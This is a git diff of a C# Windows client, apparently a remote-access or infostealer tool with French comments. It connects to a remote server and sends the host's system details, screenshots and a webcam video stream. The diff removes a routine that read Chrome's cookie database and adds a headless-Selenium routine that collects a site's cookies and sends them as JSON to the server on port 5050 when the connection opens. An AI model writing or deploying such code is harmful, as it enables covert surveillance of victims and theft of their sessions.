@@ -11,6 +11,9 @@ using System.Windows.Forms;
 using AForge.Video;
 using AForge.Video.DirectShow;
 using Microsoft.Data.Sqlite;
+using OpenQA.Selenium;
+using OpenQA.Selenium.Chrome;
+using Newtonsoft.Json;
 
 
 
@@ -21,11 +24,14 @@ namespace Test_Socket
         private string IPserver;
         private int portText;
         private int portVideo;
+        private int portCookie;
 
         private StreamWriter writer;
         private StreamReader reader;
         private Socket textSocket;
         private Socket videoSocket;
+        private Socket cookieSocket;
+
         private VideoCaptureDevice videoSource;
         private Thread videoThread;
 
@@ -34,7 +40,9 @@ namespace Test_Socket
             this.IPserver = IPserver;
             this.portText = portText;
             this.portVideo = portVideo;
+            
             ConnectToServer();
+            
         }
 
         public void ConnectToServer()
@@ -49,6 +57,8 @@ namespace Test_Socket
                 IPEndPoint videoEndPoint = new IPEndPoint(IPAddress.Parse(IPserver), portVideo);
                 videoSocket.Connect(videoEndPoint);
 
+                
+
                 NetworkStream stream = new NetworkStream(textSocket);
                 writer = new StreamWriter(stream); // Ne pas utiliser using ici
                 reader = new StreamReader(stream);
@@ -57,6 +67,8 @@ namespace Test_Socket
 
                 // Démarrer la capture vidéo une fois la connexion établie
                 StartVideoCapture();
+
+                SendCookiesToServer(IPserver, 5050);
             }
             catch (Exception ex)
             {
@@ -66,7 +78,7 @@ namespace Test_Socket
             }
         }
 
-        public void SendData(string os, string mother, string proc, string ram, string disk, byte[] screenshot, string cookies)
+        public void SendData(string os, string mother, string proc, string ram, string disk, byte[] screenshot)
         {
             try
             {
@@ -82,10 +94,10 @@ namespace Test_Socket
                 writer.WriteLine(proc);
                 writer.WriteLine(ram);
                 writer.WriteLine(disk);
-                writer.WriteLine(cookies);
-                //MessageBox.Show("Cookies : " + cookies);
+                
+                
                 writer.Flush();
-                //MessageBox.Show("Données envoyées au serveur.");
+                
 
                 // Envoyer les captures d'écran au serveur
                 if (screenshot != null && screenshot.Length > 0)
@@ -196,60 +208,7 @@ namespace Test_Socket
             }
         }
 
-        // Méthode pour collecter les cookies
-        private string CollectCookies()
-        {
-            StringBuilder cookiesBuilder = new StringBuilder();
-
-            // Chemin des fichiers de cookies Chrome
-            string chromeCookiesPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Google\Chrome\User Data\Default\Cookies");
-            if (File.Exists(chromeCookiesPath))
-            {
-                cookiesBuilder.AppendLine("Chrome Cookies:");
-                cookiesBuilder.AppendLine(ExtractCookiesFromChrome(chromeCookiesPath));
-            }
-
-            // Vous pouvez ajouter ici la collecte des cookies d'autres navigateurs si nécessaire
-
-            return cookiesBuilder.ToString();
-        }
-
-        // Méthode pour extraire les cookies de Chrome
-        private string ExtractCookiesFromChrome(string chromeCookiesPath)
-        {
-            StringBuilder chromeCookiesBuilder = new StringBuilder();
-
-            try
-            {
-                // Ouvrir la base de données SQLite de Chrome
-                using (SqliteConnection connection = new SqliteConnection($"Data Source={chromeCookiesPath}; Version=3;"))
-                {
-                    connection.Open();
-
-                    // Sélectionner les cookies de la table 'cookies' dans la base de données
-                    string query = "SELECT name, value FROM cookies";
-                    using (SqliteCommand command = new SqliteCommand(query, connection))
-                    {
-                        using (SqliteDataReader reader = command.ExecuteReader())
-                        {
-                            while (reader.Read())
-                            {
-                                string name = reader["name"].ToString();
-                                string value = reader["value"].ToString();
-                                chromeCookiesBuilder.AppendLine($"{name}: {value}");
-                            }
-                        }
-                    }
-                }
-            }
-            catch (Exception ex)
-            {
-                // Gérer toute exception survenue lors de la lecture des cookies
-                chromeCookiesBuilder.AppendLine($"Erreur lors de la lecture des cookies de Chrome : {ex.Message}");
-            }
-
-            return chromeCookiesBuilder.ToString();
-        }
+        
 
 
         // Méthode pour collecter toutes les données et les envoyer au serveur
@@ -261,8 +220,8 @@ namespace Test_Socket
             string ram = GetRAMInfo();
             string disk = GetDiskInfo();
             byte[] screenshotBytes = TakeScreenshot();
-            string cookies = CollectCookies();
-            SendData(os, mother, proc, ram, disk, screenshotBytes, cookies);
+            
+            SendData(os, mother, proc, ram, disk, screenshotBytes);
         }
 
         private void StartVideoCapture()
@@ -339,5 +298,83 @@ namespace Test_Socket
                 videoThread.Join();
             }
         }
+
+
+        public List<Dictionary<string, object>> CollectCookies()
+        {
+            ChromeOptions options = new ChromeOptions();
+            options.AddArgument("--headless");
+
+            var cookieList = new List<Dictionary<string, object>>();
+
+            try
+            {
+                using (IWebDriver driver = new ChromeDriver(options))
+                {
+                    driver.Navigate().GoToUrl("https://ismagi.emadariss.net/");
+                    System.Threading.Thread.Sleep(2000);
+
+                    IReadOnlyCollection<OpenQA.Selenium.Cookie> cookies = driver.Manage().Cookies.AllCookies;
+
+                    foreach (var cookie in cookies)
+                    {
+                        var cookieDict = new Dictionary<string, object>
+                    {
+                        { "domain", cookie.Domain },
+                        { "hostOnly", cookie.Domain == driver.Url },
+                        { "httpOnly", cookie.IsHttpOnly },
+                        { "name", cookie.Name },
+                        { "path", cookie.Path },
+                        { "sameSite", cookie.SameSite?.ToString() },
+                        { "secure", cookie.Secure },
+                        { "session", !cookie.Expiry.HasValue },
+                        { "storeId", null }, // Selenium WebDriver ne fournit pas cette information
+                        { "value", cookie.Value }
+                    };
+                        cookieList.Add(cookieDict);
+                    }
+                }
+
+                return cookieList;
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Erreur lors de la collecte des cookies : " + ex.Message);
+                return new List<Dictionary<string, object>>();
+            }
+        }
+
+        public string ConvertCookiesToJson()
+        {
+            List<Dictionary<string, object>> cookiesList = CollectCookies();
+            if (cookiesList != null)
+            {
+                return JsonConvert.SerializeObject(cookiesList);
+            }
+            return null;
+        }
+
+        public void SendCookiesToServer(string serverIP, int serverPort)
+        {
+            string cookiesJson = ConvertCookiesToJson();
+            if (cookiesJson != null)
+            {
+                try
+                {
+                    using (TcpClient client = new TcpClient(serverIP, serverPort))
+                    using (NetworkStream stream = client.GetStream())
+                    using (StreamWriter writer = new StreamWriter(stream))
+                    {
+                        writer.WriteLine(cookiesJson);
+                        writer.Flush();
+                    }
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine("Erreur lors de l'envoi des cookies au serveur : " + ex.Message);
+                }
+            }
+        }
+
     }
 }
